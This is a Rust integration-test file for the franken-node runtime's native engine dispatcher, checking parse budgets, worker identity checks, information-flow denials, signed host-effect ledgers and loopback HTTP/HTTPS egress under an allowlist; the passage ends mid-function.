//! Integration tests for EngineDispatcher native-engine compatibility.
//!
//! Tests the complete native engine execution pipeline when the `engine`
//! feature is enabled through the real `franken-node run` product supervisor,
//! plus subprocess edge cases with controlled fixture binaries when the test
//! needs deterministic success, timeout, exit-code, or signal behavior.
//!
//! Coverage includes:
//! - Native engine execution with telemetry emission
//! - Strict profile fallback rejection
//! - Comprehensive error handling and propagation
//!
//! A fixture binary proves dispatcher/process handling only; it is not counted
//! as evidence that a real franken_engine binary executed the application.

#[cfg(feature = "engine")]
use frankenengine_node::ops::engine_dispatcher::{HostEffectLedger, RunDispatchReport};
use frankenengine_node::{
    config::{Config, NetworkAllowlistEntry, PreferredRuntime, Profile},
    ops::{
        engine_dispatcher::{DispatchResolutionError, EngineDispatcher},
        telemetry_bridge::TelemetryBridge,
    },
    storage::frankensqlite_adapter::FrankensqliteAdapter,
};
use std::path::{Path, PathBuf};
#[cfg(feature = "engine")]
use std::process::{Command, ExitStatus, Stdio};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tempfile::TempDir;

fn balanced_config() -> Config {
    Config {
        profile: Profile::Balanced,
        ..Config::default()
    }
}

#[cfg(feature = "engine")]
fn franken_node_bin() -> &'static str {
    env!("CARGO_BIN_EXE_franken-node")
}

#[cfg(feature = "engine")]
struct ProductSupervisorOutput {
    status: ExitStatus,
    stdout: String,
    stderr: String,
}

#[cfg(feature = "engine")]
#[derive(serde::Deserialize)]
struct ProductRunFailureEvidence {
    schema_version: String,
    host_effect_ledger: HostEffectLedger,
}

/// Execute a native run through the same product-binary supervisor used in
/// production, then recover the public dispatch report from `run --json`.
///
/// Cargo integration-test executables are different images from the sibling
/// product binary. They therefore must not directly supervise its private
/// native-session worker: Linux correctly rejects that topology at the
/// `/proc/<parent>/exe == /proc/self/exe` boundary. Launching the public CLI
/// preserves that invariant without an environment bypass, alternate trust
/// root, or mock engine. The CLI process remains the worker's exact parent and
/// launches its own `/proc/self/exe`, just as an operator run does.
///
/// This helper proves only the product CLI -> native worker execution path. It
/// does not authorize arbitrary library embedders or different executables.
#[cfg(feature = "engine")]
fn invoke_product_supervisor(
    app_path: &Path,
    config: &Config,
    policy_mode: &str,
    engine_path: &Path,
) -> Result<ProductSupervisorOutput, String> {
    invoke_product_supervisor_with_options(app_path, config, policy_mode, engine_path, &[])
}

#[cfg(feature = "engine")]
fn invoke_product_supervisor_with_options(
    app_path: &Path,
    config: &Config,
    policy_mode: &str,
    engine_path: &Path,
    run_options: &[&str],
) -> Result<ProductSupervisorOutput, String> {
    let working_dir = app_path
        .parent()
        .ok_or_else(|| format!("application path has no parent: {}", app_path.display()))?;
    let relative_app = app_path.strip_prefix(working_dir).map_err(|error| {
        format!(
            "application {} was not beneath its working directory {}: {error}",
            app_path.display(),
            working_dir.display()
        )
    })?;

    // Direct EngineDispatcher calls do not run full CLI config validation.
    // Populate only the two first-run security prerequisites that `init` would
    // synthesize. Neither field grants guest capabilities or native-worker
    // authority; the worker trust boundary remains the kernel-authenticated
    // same-executable parent channel.
    let mut cli_config = config.clone();
    let _synthesis = cli_config.synthesize_init_security_defaults();
    let config_name = "bd-8gpux-franken-node.toml";
    std::fs::write(
        working_dir.join(config_name),
        cli_config
            .to_toml()
            .map_err(|error| format!("serialize product test config: {error}"))?,
    )
    .map_err(|error| format!("write product test config: {error}"))?;

    let output = Command::new(franken_node_bin())
        .arg("run")
        .arg(relative_app)
        .arg("--policy")
        .arg(policy_mode)
        .arg("--config")
        .arg(config_name)
        .arg("--runtime")
        .arg("franken-engine")
        .arg("--engine-bin")
        .arg(engine_path)
        .arg("--json")
        .args(run_options)
        .current_dir(working_dir)
        .stdin(Stdio::null())
        .output()
        .map_err(|error| format!("launch product native supervisor: {error}"))?;

    Ok(ProductSupervisorOutput {
        status: output.status,
        stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
    })
}

#[cfg(feature = "engine")]
fn dispatch_via_product_supervisor(
    app_path: &Path,
    config: &Config,
    policy_mode: &str,
    engine_path: &Path,
) -> Result<RunDispatchReport, String> {
    let output = invoke_product_supervisor(app_path, config, policy_mode, engine_path)?;
    if !output.status.success() {
        return Err(format!(
            "product run failed (status={:?}): stdout={:?}; stderr={:?}",
            output.status.code(),
            output.stdout,
            output.stderr
        ));
    }
    parse_product_dispatch(&output)
}

#[cfg(feature = "engine")]
fn parse_product_dispatch(output: &ProductSupervisorOutput) -> Result<RunDispatchReport, String> {
    let envelope: serde_json::Value = serde_json::from_str(&output.stdout).map_err(|error| {
        format!(
            "product run returned no completion JSON (status={:?}): {error}; stdout={:?}; stderr={:?}",
            output.status.code(),
            output.stdout,
            output.stderr
        )
    })?;
    let dispatch = envelope.get("dispatch").cloned().ok_or_else(|| {
        format!(
            "product run returned JSON without a dispatch report (status={:?}): stdout={:?}; stderr={:?}",
            output.status.code(), output.stdout, output.stderr
        )
    })?;
    serde_json::from_value(dispatch).map_err(|error| {
        format!(
            "product dispatch report was invalid (status={:?}): {error}; stdout={:?}; stderr={:?}",
            output.status.code(),
            output.stdout,
            output.stderr
        )
    })
}

#[cfg(feature = "engine")]
fn failure_evidence_via_product_supervisor(
    app_path: &Path,
    config: &Config,
    policy_mode: &str,
    engine_path: &Path,
) -> Result<ProductRunFailureEvidence, String> {
    let output = invoke_product_supervisor(app_path, config, policy_mode, engine_path)?;
    if output.status.success() {
        return Err(format!(
            "product run unexpectedly succeeded: stdout={:?}; stderr={:?}",
            output.stdout, output.stderr
        ));
    }
    let evidence: ProductRunFailureEvidence =
        serde_json::from_str(&output.stdout).map_err(|error| {
            format!(
                "product run returned invalid failure evidence (status={:?}): {error}; stdout={:?}; stderr={:?}",
                output.status.code(), output.stdout, output.stderr
            )
        })?;
    if evidence.schema_version != "franken-node/run-failure-effect-evidence/v2" {
        return Err(format!(
            "product run returned unexpected failure evidence schema {:?}; stderr={:?}",
            evidence.schema_version, output.stderr
        ));
    }
    Ok(evidence)
}

/// Create a test application file with simple JavaScript content
fn create_test_app(dir: &Path, filename: &str, content: &str) -> PathBuf {
    let app_path = dir.join(filename);
    std::fs::write(&app_path, content).expect("Failed to write test app");
    app_path
}

/// bd-fkdzv: an imported package crosses the default 64K-token boundary,
/// then executes through the real product worker with an explicit bounded
/// opt-in. This exercises config serialization, IPC, both parser handoffs,
/// CommonJS loading, guest output, and persisted receipt disclosure.
#[test]
#[cfg(feature = "engine")]
fn runtime_parse_budget_admits_large_required_module_and_records_effective_limits() {
    let workspace = TempDir::new().expect("large module workspace");
    let package_dir = workspace.path().join("node_modules/budget-fixture");
    std::fs::create_dir_all(&package_dir).expect("package directory");
    std::fs::write(
        package_dir.join("package.json"),
        r#"{"name":"budget-fixture","version":"1.0.0","main":"index.js"}"#,
    )
    .expect("package manifest");
    // Empty statements consume real parser tokens without needing tens of
    // thousands of live registers or imposing an unrelated execution limit.
    let module_source = format!("{}\nmodule.exports = 42;\n", ";".repeat(70_000));
    std::fs::write(package_dir.join("index.js"), &module_source).expect("large package");
    let app = create_test_app(
        workspace.path(),
        "app.cjs",
        "console.log(require('budget-fixture'));\n",
    );
    let mut config = balanced_config();
    let default =
        invoke_product_supervisor(&app, &config, "balanced", Path::new(franken_node_bin()))
            .expect("default-budget run");
    assert!(
        !default.status.success(),
        "64K default must reject this package"
    );
    let diagnostics = format!("{}\n{}", default.stdout, default.stderr);
    assert!(diagnostics.contains("BudgetExceeded"), "{diagnostics}");
    assert!(
        diagnostics.contains("runtime.max_parse_tokens"),
        "{diagnostics}"
    );

    config.runtime.max_parse_tokens = Some(100_000);
    let admitted =
        invoke_product_supervisor(&app, &config, "balanced", Path::new(franken_node_bin()))
            .expect("configured-budget run");
    assert!(
        admitted.status.success(),
        "explicit token opt-in must admit the imported package: stdout={} stderr={}",
        admitted.stdout,
        admitted.stderr,
    );
    let dispatch = parse_product_dispatch(&admitted).expect("successful dispatch");
    assert_eq!(dispatch.captured_output.stdout, "42\n");
    let budget = dispatch
        .engine_decision
        .expect("engine decision")
        .parser_budget;
    assert_eq!(budget.max_source_bytes, 1_048_576);
    assert_eq!(budget.max_token_count, 100_000);
    assert_eq!(budget.max_recursion_depth, 256);
    let envelope: serde_json::Value = serde_json::from_str(&admitted.stdout).expect("run JSON");
    let expected = serde_json::to_value(budget).expect("budget JSON");
    assert_eq!(envelope["receipt"]["parser_budget"], expected);
    let receipt_path = Path::new(envelope["receipt_path"].as_str().expect("receipt path"));
    let receipt_path = if receipt_path.is_absolute() {
        receipt_path.to_path_buf()
    } else {
        workspace.path().join(receipt_path)
    };
    let persisted: serde_json::Value =
        serde_json::from_slice(&std::fs::read(receipt_path).expect("persisted run receipt"))
            .expect("persisted receipt JSON");
    assert_eq!(persisted["parser_budget"], expected);

    // A larger token budget does not bypass the independent source-byte cap.
    config.runtime.max_parse_source_bytes = Some(1_024);
    let denied =
        invoke_product_supervisor(&app, &config, "balanced", Path::new(franken_node_bin()))
            .expect("source-limited import");
    assert!(
        !denied.status.success(),
        "import source budget must remain enforced"
    );
    let diagnostics = format!("{}\n{}", denied.stdout, denied.stderr);
    assert!(
        diagnostics.contains("runtime.max_parse_source_bytes"),
        "{diagnostics}"
    );
}

#[test]
#[cfg(feature = "engine")]
fn runtime_parse_budget_rejects_oversized_entry_before_guest_execution() {
    let workspace = TempDir::new().expect("source budget workspace");
    let source = format!("console.log('must-not-run');\n{}", " ".repeat(2_048));
    let app = create_test_app(workspace.path(), "app.js", &source);
    let mut config = balanced_config();
    config.runtime.max_parse_source_bytes = Some(1_024);
    let denied =
        invoke_product_supervisor(&app, &config, "balanced", Path::new(franken_node_bin()))
            .expect("source-limited run");
    assert!(!denied.status.success());
    assert!(
        !denied.stdout.contains("must-not-run"),
        "guest code must not execute"
    );
    let diagnostics = format!("{}\n{}", denied.stdout, denied.stderr);
    assert!(
        diagnostics.contains("runtime.max_parse_source_bytes=1024"),
        "{diagnostics}"
    );
    assert!(diagnostics.contains("app.js"), "{diagnostics}");
}

/// Create a controlled franken-engine fixture binary for subprocess testing.
fn create_fixture_engine_binary(dir: &Path) -> PathBuf {
    let engine_path = dir.join("franken-engine");
    #[cfg(unix)]
    {
        std::fs::write(
            &engine_path,
            "#!/bin/bash\necho 'Fixture engine output'\nexit 0\n",
        )
        .expect("Failed to write fixture engine");
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&engine_path)
            .expect("Failed to get metadata")
            .permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&engine_path, perms).expect("Failed to set permissions");
    }
    #[cfg(windows)]
    {
        let batch_path = dir.join("franken-engine.bat");
        std::fs::write(
            &batch_path,
            "@echo off\necho Fixture engine output\nexit /b 0\n",
        )
        .expect("Failed to write fixture engine batch");
        batch_path
    }

    #[cfg(unix)]
    return engine_path;
    #[cfg(windows)]
    return batch_path;
}

/// Create a slow franken-engine fixture binary for timeout testing.
/// See `create_failing_fixture_engine_binary` for the `not(engine)` gating
/// rationale (bd-4f4f0/bd-rpo4f).
#[cfg(not(feature = "engine"))]
fn create_slow_fixture_engine_binary(dir: &Path, delay_secs: u64) -> PathBuf {
    let engine_path = dir.join("slow-franken-engine");
    #[cfg(unix)]
    {
        let script = format!(
            "#!/bin/bash\necho 'Starting slow fixture engine'\nsleep {}\necho 'Fixture engine output'\nexit 0\n",
            delay_secs
        );
        std::fs::write(&engine_path, script).expect("Failed to write slow fixture engine");
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&engine_path)
            .expect("Failed to get metadata")
            .permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&engine_path, perms).expect("Failed to set permissions");
    }
    #[cfg(windows)]
    {
        let batch_path = dir.join("slow-franken-engine.bat");
        let script = format!(
            "@echo off\necho Starting slow fixture engine\ntimeout /t {} /nobreak >nul\necho Fixture engine output\nexit /b 0\n",
            delay_secs
        );
        std::fs::write(&batch_path, script).expect("Failed to write slow fixture engine batch");
        batch_path
    }

    #[cfg(unix)]
    return engine_path;
    #[cfg(windows)]
    return batch_path;
}

/// Create a franken-engine fixture binary that fails with a non-zero exit code.
/// Only the `not(engine)` subprocess-dispatch tests spawn fixture engines
/// (bd-4f4f0); with the `engine` feature the FrankenEngine plan executes
/// natively and never runs an external binary.
#[cfg(not(feature = "engine"))]
fn create_failing_fixture_engine_binary(dir: &Path, exit_code: i32) -> PathBuf {
    let engine_path = dir.join("failing-franken-engine");
    #[cfg(unix)]
    {
        let script = format!(
            "#!/bin/bash\necho 'Fixture engine error output' >&2\nexit {}\n",
            exit_code
        );
        std::fs::write(&engine_path, script).expect("Failed to write failing fixture engine");
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&engine_path)
            .expect("Failed to get metadata")
            .permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&engine_path, perms).expect("Failed to set permissions");
    }
    #[cfg(windows)]
    {
        let batch_path = dir.join("failing-franken-engine.bat");
        let script = format!(
            "@echo off\necho Fixture engine error output 1>&2\nexit /b {}\n",
            exit_code
        );
        std::fs::write(&batch_path, script).expect("Failed to write failing fixture engine batch");
        batch_path
    }
    #[cfg(unix)]
    return engine_path;
    #[cfg(windows)]
    return batch_path;
}

/// Create a franken-engine fixture binary that terminates abnormally.
/// See `create_failing_fixture_engine_binary` for the `not(engine)` gating
/// rationale (bd-4f4f0).
#[cfg(not(feature = "engine"))]
fn create_crashing_fixture_engine_binary(dir: &Path) -> PathBuf {
    let engine_path = dir.join("crashing-franken-engine");
    #[cfg(unix)]
    {
        // Use kill -9 to simulate a crash/panic
        std::fs::write(
            &engine_path,
            "#!/bin/bash\necho 'About to crash'\nkill -9 $$\n",
        )
        .expect("Failed to write crashing fixture engine");
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&engine_path)
            .expect("Failed to get metadata")
            .permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&engine_path, perms).expect("Failed to set permissions");
    }
    #[cfg(windows)]
    {
        let batch_path = dir.join("crashing-franken-engine.bat");
        // Use taskkill to simulate crash on Windows
        std::fs::write(
            &batch_path,
            "@echo off\necho About to crash\ntaskkill /f /pid %PID%\n",
        )
        .expect("Failed to write crashing fixture engine batch");
        batch_path
    }
    #[cfg(unix)]
    return engine_path;
    #[cfg(windows)]
    return batch_path;
}

/// bd-8gpux: a Cargo integration-test executable is not authorized to become
/// the direct supervisor of the sibling product worker. Even though the test
/// can construct a complete nonce-bound private request through the public
/// dispatcher, Linux must reject the different parent executable before guest
/// JavaScript runs. Positive native cases below go through the real product CLI
/// instead of weakening this boundary.
#[cfg(all(feature = "engine", target_os = "linux"))]
#[test]
fn direct_different_executable_native_supervisor_fails_closed_bd_8gpux() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let marker_path = temp_dir.path().join("different-supervisor-ran.marker");
    let marker_literal = serde_json::to_string(&marker_path)
        .expect("temporary marker path must serialize as a JavaScript string literal");
    let app_path = create_test_app(
        temp_dir.path(),
        "different-supervisor.js",
        &format!("require('fs').writeFileSync({marker_literal}, 'ran');\n"),
    );
    let config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    let fixture_engine = create_fixture_engine_binary(temp_dir.path());
    let product_worker = PathBuf::from(franken_node_bin());
    assert!(
        product_worker.is_absolute(),
        "Cargo must expose an absolute product binary path"
    );

    let dispatcher = EngineDispatcher::new(Some(fixture_engine), PreferredRuntime::FrankenEngine)
        .with_native_session_worker_path(product_worker);
    let error = dispatcher
        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
        .expect_err("a different executable must not supervise the product worker")
        .to_string();

    assert!(
        error.contains("ordinary native-session control peer executable did not match this worker"),
        "different-executable rejection must remain exact and actionable: {error}"
    );
    assert!(
        !marker_path.exists(),
        "worker identity rejection must happen before guest JavaScript executes"
    );
}

#[test]
#[cfg(feature = "engine")]
fn test_native_engine_execution_with_telemetry() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let app_path = create_test_app(
        temp_dir.path(),
        "test_app.js",
        r#"console.log("Hello from native engine");"#,
    );

    let config = balanced_config();

    // bd-rpo4f: pin an explicit fixture engine placeholder so the dispatch
    // resolution gate passes deterministically on every host. With the
    // `engine` feature, execution occurs in the product's private native worker
    // and the placeholder is never spawned; it only satisfies the availability
    // check, which can never resolve from candidates because no standalone
    // `franken-engine` binary is shipped anywhere (bd-zi9hj).
    let fixture_engine = create_fixture_engine_binary(temp_dir.path());
    // Create test telemetry bridge
    let socket_path = temp_dir.path().join("test-telemetry.sock");
    let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
    let _telemetry_bridge = TelemetryBridge::new(&socket_path.to_string_lossy(), adapter);
    let policy_mode = config.profile.to_string();

    // Execute through the real product supervisor and its same-image worker.
    // A benign completed run is allowed: the Challenge this test once pinned
    // was the expected-loss prior tax the engine now downgrades (bd-sxh8o.4,
    // bd-pgzo7), so the CLI exits 0 after the full completion envelope.
    let output = invoke_product_supervisor(&app_path, &config, &policy_mode, &fixture_engine)
        .expect("native product supervisor should return a completion envelope");
    assert_eq!(output.status.code(), Some(0));
    let report = parse_product_dispatch(&output)
        .expect("completed native run should emit a valid dispatch report");
    assert_eq!(report.runtime, "franken_engine");
    assert!(!report.used_fallback_runtime);
    assert_eq!(report.exit_code, Some(0));
    let decision = report
        .engine_decision
        .as_ref()
        .expect("native run carries the engine's decision");
    assert_eq!(decision.containment_action, "allow");
    assert_eq!(decision.risk_state, "benign");
    assert!(report.telemetry.is_some(), "Telemetry should be present");

    // Verify telemetry was emitted
    let telemetry = report.telemetry.unwrap();
    assert!(
        telemetry.drain_completed,
        "Telemetry drain should complete successfully"
    );
    assert!(
        telemetry.drain_duration_ms < 10000,
        "Telemetry drain should complete within reasonable time"
    );
}

/// bd-5r99w.12 (mock-free e2e, product apex): a real, idiomatic JS program that
/// performs fs effects, run through the PUBLIC `run --json` path, surfaces a
/// signed, SDK-verifiable host-effect ledger in `run --json` — and the bytes
/// really hit the sandbox. No mocks: real parser/lowering, real `SandboxedHostIo`
/// performing genuine fs I/O, real `EffectReceipt` hash chain, real verifier SDK
/// re-deriving the chain offline. This is the operator-facing payoff of the whole
/// trust-native effect pipeline: `franken-node run` showing WHAT the program did
/// to the host under policy.
#[test]
#[cfg(feature = "engine")]
fn run_surfaces_signed_host_effect_ledger_bd_5r99w_12() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let app_path = create_test_app(
        temp_dir.path(),
        "app.js",
        "require('fs').writeFileSync('out.txt', 'real effect bytes');\n\
         require('fs').readFileSync('out.txt');\n",
    );

    // legacy-risky grants both fs_read and fs_write so both effects execute.
    let config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };

    // A dummy engine binary in a separate directory only satisfies dispatch-plan
    // resolution (the path must exist). With the `engine` feature, execution runs
    // in the product's private native worker and never executes this binary, so
    // the sandbox (the app dir) stays clean and the run is hermetic.
    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
        .expect("native run with host effects should succeed");

    assert_eq!(report.runtime, "franken_engine");
    assert!(!report.used_fallback_runtime);

    // The write really hit the sandbox root (the app's directory).
    assert_eq!(
        std::fs::read(temp_dir.path().join("out.txt")).expect("written file on disk"),
        b"real effect bytes",
        "writeFileSync must have produced a real file in the sandbox root"
    );

    // The signed host-effect ledger is surfaced honestly.
    let ledger = report
        .host_effect_ledger
        .as_ref()
        .expect("native run must surface a host-effect ledger");
    assert_eq!(ledger.schema_version, "host-effect-ledger-v3.0");
    assert_eq!(
        ledger.effect_count, 2,
        "expected fs_write + fs_read, got {:?}",
        ledger.entries
    );
    assert_eq!(ledger.allowed_count, 2);
    assert_eq!(ledger.denied_count, 0);
    let kinds: Vec<&str> = ledger
        .entries
        .iter()
        .map(|entry| entry.receipt.effect_kind.label())
        .collect();
    assert_eq!(kinds, vec!["fs_write", "fs_read"]);

    // It auto-surfaces in `run --json` (the report is the run --json payload's
    // `dispatch` field).
    let json = serde_json::to_string(&report).expect("serialize run report as run --json");
    assert!(
        json.contains("\"host_effect_ledger\""),
        "run --json must include the host_effect_ledger"
    );
    assert!(json.contains("\"fs_write\"") && json.contains("\"fs_read\""));

    // An external auditor re-derives the chain offline from the run --json ledger
    // entries alone, with the public verifier SDK — no trust in this runtime.
    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-5r99w-12-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the effect chain offline");
    assert_eq!(verdict.effect_count, 2);
    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
}

/// bd-y4t2i.2 / engine bd-z1peg: execute the exact committed crypto entropy
/// corpus fixtures through the public product supervisor and its same-image
/// native worker. Each fixture tries to disclose an entropy-derived value
/// through the `Internal` console sink, so the `Secret` RandomRead source floor
/// must reject it during lowering before any entropy effect is dispatched.
///
/// This deliberately records a compatibility divergence rather than weakening
/// the source label, console clearance, or declassification policy to match
/// Node's observable output.
#[test]
#[cfg(feature = "engine")]
fn crypto_entropy_corpus_disclosure_fails_before_random_read_bd_y4t2i_2() {
    let fixture_root =
        Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/compat_corpus/crypto");
    let cases = [
        "0022_crypto_randombytes.js",
        "0024_crypto_randomuuid.js",
        "0025_crypto_randomuuid.js",
        "0026_crypto_randomint.js",
        "0027_crypto_randomint.js",
        "0028_crypto_randomfillsync.js",
    ];

    let config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());

    for fixture_name in cases {
        let source = std::fs::read_to_string(fixture_root.join(fixture_name))
            .unwrap_or_else(|error| panic!("read committed fixture {fixture_name}: {error}"));
        let run_dir = TempDir::new().expect("Failed to create crypto fixture run dir");
        let app_path = create_test_app(run_dir.path(), fixture_name, &source);
        let output = invoke_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
            .unwrap_or_else(|error| panic!("launch product run for {fixture_name}: {error}"));
        assert!(
            !output.status.success(),
            "entropy disclosure unexpectedly succeeded for {fixture_name}: stdout={:?}; stderr={:?}",
            output.stdout,
            output.stderr
        );
        assert!(
            output.stderr.contains("unauthorized flow detected"),
            "product failure did not report the IFC denial for {fixture_name}: {:?}",
            output.stderr
        );
        assert!(
            output.stderr.contains("Secret -> Internal"),
            "product failure did not preserve the source/sink labels for {fixture_name}: {:?}",
            output.stderr
        );
        let evidence: ProductRunFailureEvidence = serde_json::from_str(&output.stdout)
            .unwrap_or_else(|error| {
                panic!(
                    "product run returned invalid failure evidence for {fixture_name}: {error}; stdout={:?}; stderr={:?}",
                    output.stdout, output.stderr
                )
            });
        assert_eq!(
            evidence.schema_version,
            "franken-node/run-failure-effect-evidence/v2"
        );
        let ledger = evidence.host_effect_ledger;
        assert_eq!(ledger.effect_count, 0);
        assert_eq!(ledger.allowed_count, 0);
        assert_eq!(ledger.denied_count, 0);
        assert!(
            ledger.entries.is_empty(),
            "IFC must reject {fixture_name} before any RandomRead effect: {:?}",
            ledger.entries
        );
    }
}

/// bd-656a2 / bd-3894s (http leg, mock-free e2e close-out): a real, idiomatic JS
/// program that performs an `http.get` egress, run through the PUBLIC
/// `dispatch_run` path, surfaces a signed, SDK-verifiable `http_request` effect
/// in the host-effect ledger — and the framed request really reaches a loopback
/// listener. No mocks: real parser/lowering of `require('http').get(url)` to the
/// engine's `net:request` HostCall, the product-layer `SsrfGatedHostIo` policy
/// gate (config-allowlisted for the loopback sink) authorizing it, the engine's
/// real `SandboxedHostIo` network mechanism connecting and sending, a real
/// `EffectReceipt` hash chain, and the verifier SDK re-deriving the chain offline.
///
/// This is the third L1 proof-carrying subject (`http.request`) coming online
/// end to end — the close-out evidence for the http producer (bd-656a2) and the
/// remaining REQUIRED subject for bd-f5b04.2.4's GREEN acceptance bar.
#[test]
#[cfg(feature = "engine")]
fn run_surfaces_signed_http_request_effect_ledger_bd_656a2() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // A loopback listener that accepts exactly one connection and reads the
    // framed request the engine's network mechanism sends. Bound BEFORE the run
    // so the guest's connect always finds it listening. bd-3894s slice (4): the
    // engine now does a single-socket request/response round trip, so the sink
    // reads the (half-closed) request to EOF, then replies and closes so the
    // guest's response read terminates.
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
    let addr = listener.local_addr().expect("listener addr");
    let server = std::thread::spawn(move || {
        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
        stream
            .set_read_timeout(Some(Duration::from_secs(5)))
            .expect("read timeout");
        let mut received = Vec::new();
        let _ = stream.read_to_end(&mut received);
        let _ = stream.write_all(
            b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nok",
        );
        let _ = stream.flush();
        received
    });

    // An idiomatic guest program performing a single HTTP GET. The lowering
    // forwards the URL operand to the engine's `net:request` HostCall; bd-3894s
    // slice (4) makes the call evaluate to the parsed response object, but this
    // e2e asserts the recorded host-effect ledger, which is the load-bearing proof.
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let source = format!(
        "require('http').get('http://{}/');\n",
        addr // host:port form, e.g. 127.0.0.1:54321
    );
    let app_path = create_test_app(temp_dir.path(), "app.js", &source);

    // legacy-risky grants network_egress so the egress hostcall is authorized at
    // the engine layer; the product-layer SSRF gate still governs the endpoint.
    // The default policy is fail-closed (Block) and would deny loopback, so the
    // operator allowlists exactly this loopback sink — the config-driven exception
    // that `SsrfGatedHostIo::from_network_policy` turns into a signed receipt.
    let mut config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    config
        .security
        .network_policy
        .allowlist
        .push(NetworkAllowlistEntry {
            host: "127.0.0.1".to_string(),
            port: None,
            reason: "e2e: permit the loopback test sink".to_string(),
        });

    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
        .expect("native run with an allowlisted http egress should succeed");

    assert_eq!(report.runtime, "franken_engine");
    assert!(!report.used_fallback_runtime);

    // The framed request really reached the loopback listener (the mechanism ran).
    let received = server.join().expect("server thread");
    let wire = String::from_utf8_lossy(&received);
    assert!(
        wire.starts_with("GET / HTTP/1.1\r\n"),
        "the loopback sink must observe the engine-framed GET request, got {wire:?}"
    );
    assert!(
        wire.contains(&format!("Host: {addr}\r\n")),
        "the framed request must carry the Host header for {addr}, got {wire:?}"
    );

    // The signed host-effect ledger surfaces the egress as an `http_request`.
    let ledger = report
        .host_effect_ledger
        .as_ref()
        .expect("native http run must surface a host-effect ledger");
    assert_eq!(ledger.schema_version, "host-effect-ledger-v3.0");
    assert_eq!(
        ledger.effect_count, 1,
        "expected a single http_request effect, got {:?}",
        ledger.entries
    );
    assert_eq!(ledger.allowed_count, 1);
    assert_eq!(ledger.denied_count, 0);
    assert_eq!(
        ledger.entries[0].receipt.effect_kind.label(),
        "http_request",
        "the egress must be recorded as an http_request effect"
    );

    // It auto-surfaces in `run --json`.
    let json = serde_json::to_string(&report).expect("serialize run report as run --json");
    assert!(
        json.contains("\"host_effect_ledger\"") && json.contains("\"http_request\""),
        "run --json must include the http_request host-effect ledger entry"
    );

    // An external auditor re-derives the chain offline from the ledger entries
    // alone, with the public verifier SDK — no trust in this runtime.
    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-656a2-http-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the http effect chain offline");
    assert_eq!(verdict.effect_count, 1);
    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
}

/// bd-3894s slice (5) (https leg, mock-free e2e — real TLS): a real JS program
/// performing `require('https').get('https://127.0.0.1:PORT/')` runs through the
/// PUBLIC `run --json` path against a REAL rustls TLS listener on loopback.
/// The engine's wire builder marks the effect `use_tls` (https scheme), the
/// SSRF gate authorizes the allowlisted endpoint, and the network mechanism
/// performs the round trip inside a genuine TLS session: the listener only
/// observes the framed GET AFTER a successful handshake + decrypt (a plaintext
/// egress could never produce it), trust in the test anchor flows through the
/// operator config seam `[security.network_policy].tls_extra_roots_pem_path`,
/// and the signed host-effect ledger surfaces the egress as an allowed
/// `http_request` effect that the public verifier SDK re-derives offline.
#[test]
#[cfg(feature = "engine")]
fn run_surfaces_signed_https_request_effect_ledger_bd_3894s() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // A fresh self-signed anchor for 127.0.0.1 and a one-shot rustls server.
    let certified = rcgen::generate_simple_self_signed(vec!["127.0.0.1".to_string()])
        .expect("generate self-signed certificate");
    let cert_pem = certified.cert.pem();
    let cert_der = certified.cert.der().clone();
    let key_der = rustls_pki_types::PrivateKeyDer::Pkcs8(certified.key_pair.serialize_der().into());
    let tls_provider = Arc::new(rustls::crypto::ring::default_provider());
    let server_config = rustls::ServerConfig::builder_with_provider(tls_provider)
        .with_safe_default_protocol_versions()
        .expect("server protocol versions")
